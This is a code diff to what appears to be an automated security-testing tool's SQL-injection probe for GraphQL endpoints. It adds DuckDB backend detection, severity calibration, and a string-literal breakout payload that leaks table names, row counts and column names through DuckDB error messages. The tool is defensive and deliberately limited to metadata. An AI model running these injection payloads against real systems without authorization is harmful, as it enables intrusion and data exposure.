@@ -69,6 +69,41 @@ def _inject_path(body: dict, dotted: str, value: Any) -> dict:
     return injected
 
 
+def _path_exists(body: dict, dotted: str) -> bool:
+    """True if ``dotted`` (relative to variables, e.g. ``v.contentTitle`` or a plain top-level name)
+    resolves to an EXISTING leaf in the operation's variables. A payload injected at a path the op
+    does not have goes nowhere and yields a silent false-negative, so the caller validates first."""
+    variables = body.get("variables") if isinstance(body, dict) else None
+    if not isinstance(variables, dict):
+        return False
+    node: Any = variables
+    for key in [p for p in dotted.split(".") if p]:
+        if not isinstance(node, dict) or key not in node:
+            return False
+        node = node[key]
+    return True
+
+
+def _string_var_paths(body: dict) -> List[str]:
+    """Dotted paths (relative to variables) of every STRING-valued leaf in the operation's
+    variables — the candidate injection points to suggest when the requested one is absent."""
+    out: List[str] = []
+
+    def _descend(node: Any, prefix: str) -> None:
+        if isinstance(node, dict):
+            for key, val in node.items():
+                child = f"{prefix}.{key}" if prefix else key
+                if isinstance(val, str):
+                    out.append(child)
+                elif isinstance(val, dict):
+                    _descend(val, child)
+
+    variables = body.get("variables") if isinstance(body, dict) else None
+    if isinstance(variables, dict):
+        _descend(variables, "")
+    return out
+
+
 # DuckDB error(expr) embeds the expression's value in "Invalid Input Error: <value>" (also
 # "Conversion Error: ..."), so a `(SELECT error(version()))` payload leaks version() in the
 # GraphQL errors[] message. Parse that out as read-only impact proof.
@@ -103,6 +138,64 @@ def _extract_duckdb_version(text: str) -> Optional[str]:
     return None
 
 
+# DuckDB error families — used to detect the backend (DuckDB is not in db_dialect._DB_MARKERS).
+_DUCKDB_SIGNATURE_RE = re.compile(
+    r"invalid input error|binder error|catalog error|conversion error|parser error|duckdb",
+    re.IGNORECASE)
+
+
+def _detect_dbms(error_text: str) -> str:
+    """Best-effort backend from a SQL error. DuckDB first (not covered by db_dialect), else the
+    networked dialects via db_dialect.definite_db, else 'unknown'."""
+    if _DUCKDB_SIGNATURE_RE.search(error_text or ""):
+        return "DuckDB"
+    try:
+        from dast.agents.db_dialect import definite_db
+        return definite_db([error_text or ""]) or "unknown"
+    except Exception:
+        return "unknown"
+
+
+def _duckdb_leak_payload(label: str, inner_sql: str) -> str:
+    """A read-only DuckDB error-leak payload: break out of the string literal and embed the result
+    of ``inner_sql`` (metadata only) after ``label=`` in a DuckDB error message."""
+    return f"x', (SELECT error(CONCAT('{label}=', ({inner_sql})))) as v, '"
+
+
+def _extract_labeled_leak(text: str, label: str) -> Optional[str]:
+    """Pull ``<label>=<value>`` out of a DuckDB error surfaced in a GraphQL errors[] message
+    (schema/count metadata, never a secret). Returns the value (<= 500 chars) or None."""
+    pat = re.compile(re.escape(label) + r"=([^\"'}\n]{0,500})")
+    for msg in _graphql_error_messages(text):
+        m = pat.search(msg)
+        if m:
+            return m.group(1).strip()
+    return None
+
+
+_EMBEDDED_DBMS = ("DuckDB", "SQLite")
+_NETWORKED_DBMS = ("MySQL", "PostgreSQL", "MSSQL", "Oracle")
+
+
+def _severity_for(dbms: str, scope_bypass: str) -> "tuple[str, str]":
+    """Default finding severity + rationale from the detected DBMS and the scope-bypass verdict.
+    Embedded DBs (no RCE/file/write) are confidentiality-only; severity turns on whether the read
+    crossed the authorized scope. The operator can still override via the ``severity`` arg."""
+    if dbms in _EMBEDDED_DBMS:
+        if scope_bypass == "true":
+            return "high", (f"{dbms} is embedded (no RCE/file/write) but the injection reads data "
+                            "BEYOND the user's authorized scope")
+        if scope_bypass == "false":
+            return "low", (f"{dbms} is embedded; the injection reads only data already within the "
+                           "user's authorized scope")
+        return "medium", (f"{dbms} is embedded (no RCE/file/write); read-only SQLi confirmed, scope "
+                          "bypass not confirmed")
+    if dbms in _NETWORKED_DBMS:
+        return "high", (f"networked {dbms}: read-only SQLi confirmed; broader impact "
+                        "(stacked writes / file / possible RCE) may be reachable")
+    return "medium", "DBMS unknown; read-only SQLi confirmed, impact bounds undetermined"
+
+
 _SCHEMA: Dict[str, Any] = {
     "type": "object",
     "properties": {
@@ -123,8 +216,16 @@ _SCHEMA: Dict[str, Any] = {
                          "application/json)."},
         "record": {"type": "boolean", "description": "Record a finding when CONFIRMED (default true)."},
         "title": {"type": "string", "description": "Finding title (optional; a sensible default is used)."},
-        "severity": {"type": "string", "description": "critical|high|medium|low|info (default high)."},
+        "severity": {"type": "string", "description": "critical|high|medium|low|info. If omitted, "
+                     "severity is calibrated from the detected DBMS + scope-bypass verdict."},
         "cwe": {"type": "string", "description": "CWE id (default CWE-89)."},
+        "target_table": {"type": "string", "description": "Optional. A table name to quantify impact "
+                         "against (DuckDB/graphql_var): leaks its COUNT(*) and column NAMES via "
+                         "information_schema (NEVER column values / PII). Used to measure reach."},
+        "scope_where": {"type": "string", "description": "Optional SQL predicate describing the "
+                        "user's AUTHORIZED subset of target_table (e.g. an account/group filter). "
+                        "The probe compares total COUNT(*) vs COUNT(*) WHERE <scope_where> to decide "
+                        "whether the read crosses the authorized scope (scope_bypass)."},
     },
     "required": ["url", "injection_point"],
 }
@@ -218,6 +319,18 @@ async def _sqli_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
         if gql_body is None:
             return {"ok": False, "error": "no GraphQL body given and none captured for this URL — "
                     "pass 'body' as {query, variables, operationName} JSON"}
+        # Guard against a silent false-negative: if the injection_point does not exist in THIS
+        # operation's variables, a payload injected there goes nowhere and the probe would report a
+        # misleading NOT CONFIRMED. Fail loudly instead, naming the operation and its string fields,
+        # so the caller targets a real field (or captures the right operation).
+        if not _path_exists(gql_body, point):
+            candidates = _string_var_paths(gql_body)
+            op_name = gql_body.get("operationName") if isinstance(gql_body, dict) else None
+            return {"ok": False, "error": f"injection_point '{point}' is not a variable of the "
+                    f"captured operation{f' {op_name!r}' if op_name else ''} — probing it would be "
+                    "a false negative. Target one of this operation's string variables, or capture "
+                    "the operation that actually carries the field.",
+                    "operation": op_name, "available_string_fields": candidates}
 
     source_label = getattr(ctx, "source_label", None)
     # Resolve cookies + sub-app Bearer + CSRF once (same machinery as send_request), applied to
@@ -322,6 +435,8 @@ async def _sqli_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
             # Impact proof: best-effort read-only version()/db/user extraction (error-based only).
             facts: Dict[str, str] = {}
             proof_summary = ""
+            dbms = "unknown"
+            scope_bypass = "unknown"
             if confirmed and technique == "error-based":
                 async def _send(value: str) -> Optional["httpx.Response"]:
                     return await _send_value(client, value)
@@ -351,6 +466,54 @@ async def _sqli_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
                             steps.append({"label": "duckdb version leak", "payload": payload,
                                           "version": ver})
                             break
+
+                # DBMS from the confirming error (DuckDB isn't in db_dialect, so detect it here).
+                dbms = _detect_dbms(evidence_snippet)
+
+                # Deterministic impact facts + scope-bypass differential (DuckDB/graphql_var only).
+                # All reads are schema/count metadata via the read-only error(CONCAT(...)) leak —
+                # NEVER column values / PII. Bounded to a few extra requests, only when meaningful.
+                if dbms == "DuckDB" and location == "graphql_var":
+                    fact_sql: Dict[str, str] = get_value("sqli", "duckdb_fact_sql", {}) or {}
+
+                    async def _leak(label: str, inner_sql: str) -> Optional[str]:
+                        if not inner_sql:
+                            return None
+                        resp = await _send_value(client, _duckdb_leak_payload(label, inner_sql))
+                        return _extract_labeled_leak(resp.text, label) if resp is not None else None
+
+                    tables = await _leak("TBLS", fact_sql.get("tables", ""))
+                    if tables:
+                        facts["reachable_tables"] = tables
+                        steps.append({"label": "reachable tables", "value": tables})
+
+                    target = str(args.get("target_table", "")).strip()
+                    if target:
+                        rc = await _leak("RC", fact_sql.get("row_count", "").format(table=target))
+                        cols = await _leak("COLS", fact_sql.get("columns", "").format(table=target))
+                        if rc:
+                            facts["row_count"] = rc
+                        if cols:
+                            facts["columns"] = cols
+                        steps.append({"label": "target-table facts", "table": target,
+                                      "row_count": rc, "columns": cols})
+
+                        where = str(args.get("scope_where", "")).strip()
+                        if where and rc:
+                            srec = fact_sql.get("scoped_count", "")
+                            try:
+                                scoped_sql = srec.format(table=target, where=where)
+                            except (KeyError, IndexError):
+                                scoped_sql = ""
+                            scoped = await _leak("SRC", scoped_sql)
+                            if scoped:
+                                try:
+                                    scope_bypass = "true" if int(scoped) < int(rc) else "false"
+                                except ValueError:
+                                    scope_bypass = "unknown"
+                                facts["scoped_row_count"] = scoped
+                                steps.append({"label": "scope differential", "total": rc,
+                                              "scoped": scoped, "scope_bypass": scope_bypass})
     except Exception as exc:
         return {"ok": False, "error": f"probe failed: {str(exc)[:200]}", "steps": steps}
 
@@ -362,14 +525,20 @@ async def _sqli_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
         verdict = (f"NOT CONFIRMED — no SQL error differential or timing delay for '{point}' "
                    f"({location}).")
 
+    # Calibrate the default severity from DBMS + scope; the operator can still override via `severity`.
+    computed_sev, sev_rationale = _severity_for(dbms, scope_bypass)
+    sev_arg = str(args.get("severity", "")).strip().lower()
+    severity = sev_arg if sev_arg in _VALID_SEVERITIES else computed_sev
+
     result: Dict[str, Any] = {"ok": True, "confirmed": confirmed, "verdict": verdict,
                               "technique": technique, "facts": facts if confirmed else {},
+                              "dbms": dbms, "scope_bypass": scope_bypass,
+                              "severity": severity if confirmed else None,
+                              "severity_rationale": sev_rationale if confirmed else None,
                               "steps": steps}
 
     if confirmed and bool(args.get("record", True)) and getattr(ctx, "store", None) is not None:
-        severity = str(args.get("severity", "high")).strip().lower()
-        if severity not in _VALID_SEVERITIES:
-            severity = "high"
+        evidence = verdict + f" [backend={dbms}; scope_bypass={scope_bypass}; {sev_rationale}]"
         finding = {
             "title": str(args.get("title", "")).strip()
             or f"SQL injection in '{point}' ({technique})",
@@ -377,7 +546,9 @@ async def _sqli_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
             "attack_type": "sqli",
             "cwe": str(args.get("cwe", "CWE-89")).strip() or "CWE-89",
             "parameter": point,
-            "evidence": verdict,
+            "evidence": evidence,
+            "dbms": dbms,
+            "scope_bypass": scope_bypass,
             "steps": steps,
             "extracted_data": facts,
             "confirmed": True,
